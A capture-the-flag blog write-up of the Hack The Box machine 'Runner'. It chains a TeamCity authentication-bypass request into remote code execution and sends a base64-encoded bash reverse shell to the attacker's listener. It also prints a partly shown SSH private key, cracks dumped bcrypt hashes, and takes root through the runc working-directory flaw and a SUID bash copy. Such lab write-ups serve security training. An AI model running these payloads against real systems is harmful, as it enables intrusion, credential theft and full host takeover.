---
layout: post
title: "HTB: Runner"
box: runner
img: /img/runner/runner
author: Andrew Cherney
date: 2024-08-24
tags: htb medium-box linux webapp cve docker john season-5
icon: "assets/icons/runner.png"
post_description: "This box starts with a CVE affecting TeamCity which creates and admin user. The new admin user can enable the debugging processes to allow for RCE from the same exploit, giving a foothold as tcuser. An ssh key can be found and after testing for both home users it can be determined to be john's. A local portainer service can be accessed after backing up the teamcity webapp and grepping for an admin hash. Lastly a CVE allows for setting the working directory to a specific location to get a root shell."

---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -sC -sV -p22,80,8000 10.129.51.235

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Runner - CI/CD Specialists
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Port 8000

```bash
dirsearch -u http://runner.htb:8000/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Season5/Runner/reports/http_runner.htb_8000/__24-04-23_19-54-13.txt

Target: http://runner.htb:8000/

[19:54:13] Starting: 
[19:55:13] 200 -    3B  - /health
[19:55:56] 200 -    9B  - /version

Task Completed
```

I looked around a bit more at this endpoint before moving on, seems there aren't any other files or directories I can find immediately. 

## Port 80

{% include img_link src="/img/runner/runner_front_page" alt="front_page" ext="png" trunc=600 %}

In my case next I used a large scanning list to check for subdomains, though in retrospect the webpage can be used to look for a certain technology or keyword that indicated the subdomain.

```bash
ffuf -w /opt/wordlists/seclists/Discovery/DNS/namelist.txt -u http://runner.htb -H "Host: FUZZ.runner.htb" -mc 200,401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 835ms]
:: Progress: [151265/151265] :: Job [1/1] :: 531 req/sec :: Duration: [0:05:24] :: Errors: 0 ::
```

![Teamcity Login]({{ page.img }}_teamcity_login.png)

Digging for specific version exploits it's easy to find a few 2024 CVEs for teamcity. CVE-2024-27198 is an auth bypass that can lead to RCE given the restapi debug is set to true. I shelled out the important parts so I could spam some burp requests and make an admin account. [https://github.com/yoryio/CVE-2024-27198/blob/main/CVE-2024-27198.py](https://github.com/yoryio/CVE-2024-27198/blob/main/CVE-2024-27198.py) is the script I ripped the request from.

```json
POST /raccoon?jsp=/app/rest/users;.jsp

Content-Type: application/json

{"username":"raccoon","password":"raccoon","email":"raccoon@raccoon.xyz","roles":{"role": [{"roleId:":"SYSTEM_ADMIN","scope":"g"}]}}
```

Effectively the exploit lets you bypass the jsp parameter restrictions and send a post request to any endpoint desired, here it is users to make a new user with the role SYSTEM_ADMIN. Additionally a GET request to the endpoint returns all users.

![Teamcity user read]({{ page.img }}_teamcity_rest_test.png)

Endpoint works, we have access, time to make the new user of raccoon.

![Teamcity CVE-2024-27198]({{ page.img }}_burp_teamcity_exploit.png)

![Teamcity raccoon admin* login]({{ page.img }}_teamcity_dashboard.png)

Scouring a bit the only functionality I have here is to create a project:

# User as tcuser

## CVE-2024-27198, take 2

[https://github.com/Stuub/RCity-CVE-2024-27198](https://github.com/Stuub/RCity-CVE-2024-27198) Demonstrates a way to use the debug process to run code within rest api using this auth bypass. 

```python
python3 exploit.py -t http://teamcity.runner.htb -c whoami



░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░    ░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
    
                                                                                    
    

Developed by: @stuub | Github: https://github.com/stuub

Admin Account Creation & RCE on JetBrains TeamCity in correspondance to (CVE-2024-27198)
Purely for ethical and educational purposes

Usage: python3 RCity.py -t http://teamcity.com:8111
[*] Target: http://teamcity.runner.htb

[*] Getting Tomcat version...
[+] Tomcat Version: Apache Tomcat/9.0.75

[*] Gathering OS Info...
[+] OS Name: Linux
[+] OS Architecture: amd64

[*] Creating Admin user...
[+] Admin user created successfully
[+] Admin user: RCity_Rules_899
[+] Password: sZKYbfiD
[*] User ID: 15

[*] Getting CSRF token...
[+] CSRF token: CD6DC464470E9CB3A6D7809EE1DE949F

[*] Creating token...
[*] Token created successfully
[+] Token name: tPV4ND2QO5

[*] Getting all user information...
[+] User ID: 1, Username: admin, Tokens: 
[+] User ID: 2, Username: matthew, Tokens: 
[+] User ID: 11, Username: raccoon, Tokens: 
[+] User ID: 12, Username: m23ylx2f, Tokens: byDQoVPvpC
[+] User ID: 13, Username: xhkxij86, Tokens: jyea3NotU5
[+] User ID: 14, Username: uj8p7zho, Tokens: XHgfsaqccq
[+] User ID: 15, Username: rcity_rules_899, Tokens: tPV4ND2QO5

[*] Executing command: whoami
ding with error, status code: 400 (Bad Request).
Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via "rest.debug.processes.enable" internal property
Invalid request. Please check the request URL and data are correct
```

Disabled debug process puts a damper into my plans. I log in with the new account created and notice some more options.

![Teamcity rcity project +]({{ page.img }}_admin_project_plus.png)

![Teamcity raccoon project create]({{ page.img }}_project_create.png)

I experimented around with trying to get a project imported but I couldn't seem to find a way to get a shell out of it, onto another avenue. Now that I have the administration tab I can maybe set some properties or even use debug tools locally in the webapp. 

Some confirmation of other findings I found the user tab:

![Teamcity rcity users]({{ page.img }}_users.png)

Under Diagnostics there are internal properties, and given the rest debug process wasn't enabled maybe I can add that property here.

![Teamcity rcity debug enable]({{ page.img }}_debug_enable.png)

![Teamcity rcity properties]({{ page.img }}_internal_properties.png)

Next I'll run the tool which will make a new admin then try and run a command.


```python
python3 exploit.py -t http://teamcity.runner.htb -c "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzc3NzcgMD4mMQ==' | base64 -d | bash"



░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░    ░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
    
...
...

[*] Executing command: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Lzc3NzcgMD4mMQ==' | base64 -d | bash
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.13 44312
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
   Welcome to TeamCity Server Docker container

 * Installation directory: /opt/teamcity
 * Logs directory:         /opt/teamcity/logs
 * Data directory:         /data/teamcity_server/datadir

   TeamCity will be running under 'tcuser' user (1000/1000)

tcuser@647a82f29ca0:~/bin$ whoami
whoami
tcuser
```

# User as john

## Container Oopsie

I did some searching in this obvious container and came across an SSH key.

```bash
tcuser@647a82f29ca0:~$ lsblk
lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda      8:0    0  11G  0 disk 
├─sda1   8:1    0   1M  0 part 
├─sda2   8:2    0  10G  0 part /opt/teamcity/logs
└─sda3   8:3    0   1G  0 part [SWAP]
tcuser@647a82f29ca0:~$ find / -name "id_rsa" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
tcuser@647a82f29ca0:~$ cat /data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
<fig/projects/AllProjects/pluginData/ssh_keys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy
/R2GQpBWUDB9rUS+mtHpm4c3786g11IPZo+74I7BhOn1Iz2E5KO0tW2jefylY2MrYgOjjq
5fj0Fz3eoj4hxtZyuf0GR8Cq1AkowJyDP02XzIvVZKCMDgVNAMH5B7COTX8CjUzc0vuKV5
iLSi+vRx6vYQpQv4wlh1H4hUlgaVSimoAqizJPUqyAi9oUhHXGY71x5gCUXeULZJMcDYKB
Z2zzex3+iPBYi9tTsnCISXIvTDb32fmm1qRmIRyXAAAFgGL91WVi/dVlAAAAB3NzaC1yc2
EAAAGBAJZNq0YZu09nYNs9/mOoqEjlbM7zZQOMEUuLcvKqxjEgqZ2chCEj5YbRxqU7tKBi
NdRU7p+x80I+zq3u2DAvkrDCJUu/DBlNqIG9E6dmzmOUTdf1/TIiv0hOJYk544T1NRagSH
sZlypYEv47+e1lLXOQrIE1BmJKWl+nE9oHojahy5weUA/mSiVgX5Rej/a07c5BHXFmCrQ6
dD4XLtRVFXkCTqW9d8Py9BhosmtkZGYKyMF0epd2Al/pgURX4URRy5nf5YMv0dhkKQVlAw
fa1EvprR6ZuHN+/OoNdSD2aPu+COwYTp9SM9hOSjtLVto3n8pWNjK2IDo46uX49Bc93qI+
IcbWcrn9BkfAqtQJKMCcgz9Nl8yL1WSgjA4FTQDB+Qewjk1/Ao1M3NL7ileYi0ovr0cer2
...
-----END OPENSSH PRIVATE KEY-----
```

Users are john and matthew, time to try both.

```bash
ssh john@runner.htb -i id_rsa 
The authenticity of host 'runner.htb (10.10.11.13)' can't be established.
ECDSA key fingerprint is SHA256:/GPlBWttNcxd3ra0zTlmXrcsc1JM6jwKYH5Bo5qE5DM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'runner.htb,10.10.11.13' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Wed Apr 24 08:48:40 PM UTC 2024

  System load:                      0.2734375
  Usage of /:                       79.9% of 9.74GB
  Memory usage:                     43%
  Swap usage:                       0%
  Processes:                        226
  Users logged in:                  0
  IPv4 address for br-21746deff6ac: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.13
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:b326

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

john@runner:~$ cat user.txt 
a0662d043f7e--------------------
```


# Root

## Initial Enum

```bash
john@runner:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
john@runner:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```bash
john@runner:~$ cat /etc/nginx/sites-enabled/portainer
server {
    listen 80;
    server_name portainer-administration.runner.htb;

    location / {
        proxy_pass https://localhost:9443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

Add that to my hosts and head to the new subdomain.

![portainer login]({{ page.img }}_portainer_io.png)

Need a password for that login, time to do some more thinking or searching.

## Teamcity Backup

I ended up circling back to teamcity as there is likely a backup function and I know the two users of this machine have accounts stored within that backup database. 

![Teamcity rcity backup]({{ page.img }}_teamcity_backup.png)

![Teamcity rcity download backup]({{ page.img }}_teamcity_last_backup.png)


```bash
ls

charset  database_dump  export.report  metadata  version.txt


cd database_dump/
ls

action_history           domain_sequence     server                         usergroups
agent_pool               hidden_health_item  server_health_items            usergroup_watch_type
agent_pool_project       meta_file_line      server_property                user_projects_visibility
audit_additional_object  node_locks          server_statistics              user_property
backup_info              node_tasks          single_row                     user_roles
build_queue_order        permanent_tokens    stats_publisher_state          users
comments                 project             usergroup_notification_data    vcs_root
config_persisting_tasks  project_mapping     usergroup_notification_events  vcs_root_mapping
db_version               remember_me         usergroup_roles                vcs_username
```

Instead of manually searching for admin hashes in these I'll grep all the files for admin:

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Season5/Runner/teamcity_backup/database_dump]
└──╼ $grep admin -iR .
./user_roles:1, SYSTEM_ADMIN, 
./user_roles:11, SYSTEM_ADMIN, 
./user_roles:12, SYSTEM_ADMIN, 
./user_roles:13, SYSTEM_ADMIN, 
./user_roles:14, SYSTEM_ADMIN, 
./user_roles:15, SYSTEM_ADMIN, 
./user_roles:16, SYSTEM_ADMIN, 
./user_roles:17, SYSTEM_ADMIN, 
./user_roles:18, SYSTEM_ADMIN, 
./user_roles:19, SYSTEM_ADMIN, 
./user_roles:20, SYSTEM_ADMIN, 
./user_roles:21, SYSTEM_ADMIN, 
./user_roles:22, SYSTEM_ADMIN, 
./user_roles:23, SYSTEM_ADMIN, 
./user_roles:24, SYSTEM_ADMIN, 
./user_roles:25, SYSTEM_ADMIN, 
./user_roles:26, SYSTEM_ADMIN, 
./user_roles:27, SYSTEM_ADMIN, 
./user_roles:28, SYSTEM_ADMIN, 
./user_roles:29, SYSTEM_ADMIN, 
./vcs_username:1, anyVcs, -1, 0, admin
./comments:201, -42, 1709746543407, "New username: \'admin\', new name: \'John\', new email: \'john@runner.htb\'"
./users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1709150093702, BCRYPT
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Season5/Runner/teamcity_backup/database_dump]
└──╼ $cat users
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1709150093702, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, rcity_rules_779, $2a$07$ZnW.SFrdYjgdWbZCCmQ8DOC5lPqI2brZv5tpWJ/Z4jemRFPAqEq3G, , github@stuub.com, 1713987566317, BCRYPT
12, rcity_rules_989, $2a$07$Vp2p6gezeBAt6ICn1Qj60ehdcnlPi83WtnpWY18GN/yVhMexZ62km, , github@stuub.com, 1713987887409, BCRYPT
13, rcity_rules_080, $2a$07$Ye9BPvGy9dDn5YHhGcpzpuJEEhlH9pLQUI3gb1g9HhWkJnF7Z4k5m, , github@stuub.com, 1713987965490, BCRYPT
14, rcity_rules_961, $2a$07$4x8EyupH5oPsR7zebcLKx.2NF9j2ce/0VXHkyap/n.DHI2ykiYOKO, , github@stuub.com, 1713988204220, BCRYPT
15, rcity_rules_143, $2a$07$Lvn1rhKO0d9pLgDLPvpKTuZcbso52mTPmONA9O9Ak86nQameWuAGq, , github@stuub.com, 1713988254405, BCRYPT
16, rcity_rules_679, $2a$07$ZHjso95fmQLG8SjMlQfAs.h8l4wmRRdhg5rmRi3.2mt9BHpiI01m., , github@stuub.com, 1713988303836, BCRYPT
17, rcity_rules_913, $2a$07$GFkbkQj2IXXPCqoRKfFAweg7Zs/KIjFBDULR9bf7mma.WbaGM3Yhm, , github@stuub.com, 1713988342407, BCRYPT
18, rcity_rules_063, $2a$07$sRaBqlv7NnWh/6UN9IVD1OaXxFXl.Ap.MOE2gP.SfKjb5teV7V6my, , github@stuub.com, 1713988741565, BCRYPT
19, rcity_rules_818, $2a$07$mM3oJEvnUmX0x030H.nM0.rWrNmBp1BGwsyoWw/Rynay8EUiD87vi, , github@stuub.com, 1713988798748, BCRYPT
20, rcity_rules_604, $2a$07$Rbu1V1.fE4GPslIdrOfNQe5DTRp2sG93UWFb./FT6JBg/xnCmnvX2, , github@stuub.com, 1713988811715, BCRYPT
21, rcity_rules_103, $2a$07$V61bRoo02jtc3eBlZyKdUOcvYDdLRcqygExPsI0zre2wZpOeW2oay, , github@stuub.com, 1713988892722, BCRYPT
22, rcity_rules_047, $2a$07$9RWbfhnW/LC5gqKcveyCbuure7DQa4ccy33GNChqMG.pftWhOX4Wa, , github@stuub.com, 1713988908984, BCRYPT
23, rcity_rules_623, $2a$07$0.ZP7YNLfd3NmXEqF1CFOeiQsbonAsPZId9gSluPnDKGo.WqQLefi, , github@stuub.com, 1713988927431, BCRYPT
24, rcity_rules_451, $2a$07$OJ1OWYjCbBI315EqJwR0YevTlBjZSAU6mmoRzMQHvckNyk7KQ9R4G, , github@stuub.com, 1713988975807, BCRYPT
25, rcity_rules_028, $2a$07$XK6HkWQWV32kisg71XbZ4uOfWf3wV.Qbdy44WCM46irHY1/pKuOlC, , github@stuub.com, 1713988981664, BCRYPT
26, rcity_rules_914, $2a$07$/7zhfM.0rvDOsG7rGg.7u.5JBxpJ0lsow5rNcZR8MLCEb52K9DoSu, , github@stuub.com, 1713988995451, BCRYPT
27, rcity_rules_725, $2a$07$vAl5BiYa5es6.z1RnmDtw.oQjdZDrOVzSsCu3C6E1oe2hp7GTBoKu, , github@stuub.com, 1713989010564, BCRYPT
28, rcity_rules_242, $2a$07$D8kZu2O7ZrpiFznZh.8/Me9DRigOLhmuFG8uMxXH2JhL1BSDzBW4O, , github@stuub.com, 1713989033414, BCRYPT
29, rcity_rules_453, $2a$07$ZMJytkewbOjFYyja7m/PTOqDsy/yRscI0G4YyGGzjqTkC490Rh9ci, , github@stuub.com, 1713989096040, BCRYPT
```

Add both to the file and crack, only one comes out. Here you can see how many times myself and other hackers on the box used the exploit to create an admin user while attempting to run code.

```bash
john hashes --wordlist=/opt/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
piper123         (?)
```

![portainer dashboard]({{ page.img }}_portainer_dashboard.png)

## runc exploit

This portainer.io site is effectively a wrapper for docker to spin up and interact with containers. There is some reading material around CVEs affecting docker and its components, in this case there exists a runc vulnerability discovered in 2024: CVE-2024-21626. [https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/](https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/) is a breakdown of vulnerabilities affecting docker and at the top is our runc exploit. 

[https://github.com/NitroCao/CVE-2024-21626](https://github.com/NitroCao/CVE-2024-21626) goes over the exploit in application, in effect if the working directory is set to **/proc/self/fd/8** or 7 then the console for the container will have root access on the local machine. runc is used by containerd, when **runc run** is used it created an object which needs an interface object called **cgroups.Manager**. To manage **cgroupsfs** it needs to open **/sys/fs/cgroup** and subsequently never closes the file descriptor, so a child process can access the host filesystem through the endpoint described above. 

More info on this here: [https://nitroc.org/en/posts/cve-2024-21626-illustrated/](https://nitroc.org/en/posts/cve-2024-21626-illustrated/). Below is the following settings to change for this exploit to work.

Select the image:

![container create portainer]({{ page.img }}_image_proc_cve.png)

Set the working directory (mine worked with 7 not 8 image is wrong lol)

![container create portainer]({{ page.img }}_portainer_proc_cve.png)

Check running containers and go into actions:

![container running check]({{ page.img }}_containers+portainer.png)

Select console:

![container details]({{ page.img }}_container_details.png)

Define the console type:

![console defining container]({{ page.img }}_console_portainer.png)

Win:

![runc exploit complete]({{ page.img }}_portainer_console_root.png)

I decided to copy /bin/bash to tmp then make it an suid for true root.

```bash
john@runner:/opt/portainer$ ls /tmp
bash
john@runner:/opt/portainer$ /tmp/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
7be08b7dd2f838------------------
bash-5.1# 
```
